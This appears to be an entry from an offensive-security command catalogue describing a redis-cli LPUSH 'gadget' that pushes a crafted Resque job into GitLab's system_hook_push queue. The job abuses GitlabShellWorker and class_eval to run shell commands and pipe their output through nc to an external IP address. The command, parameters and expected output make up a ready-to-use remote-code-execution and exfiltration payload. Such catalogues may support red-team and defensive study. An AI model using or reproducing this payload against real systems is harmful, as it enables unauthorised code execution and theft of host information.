---
id: cmd-redis-lpush-gadget
name: redis-lpush-rce-gadget
type: command
executor: redis-cli
data: >-
  lpush resque:gitlab:queue:system_hook_push
  "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|(hostname;
  ps aux) | nc 51.75.74.52 11211 ').read\"],\"queue\":\"system_hook_push\"}"
output: Command execution output sent to attacker's nc listener
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.337Z'
platforms:
  - Linux
tags:
  - redis
  - rce
  - resque
verified: false
validated: true
submitted: true
---

# redis-lpush-rce-gadget

## Command

```bash
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|(hostname; ps aux) | nc 51.75.74.52 11211 ').read\"],\"queue\":\"system_hook_push\"}"
```

## Description

Pushes a malicious job to the Resque system_hook_push queue, using GitlabShellWorker to execute class_eval with a pipe to nc for RCE output exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| key | Queue key: resque:gitlab:queue:system_hook_push | Yes |
| value | JSON payload with class and args for eval | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Integer response from LPUSH (queue length), with RCE output received on nc listener.

## Related

- [[procedures/Exploit-Redis-Injection-for-RCE]]
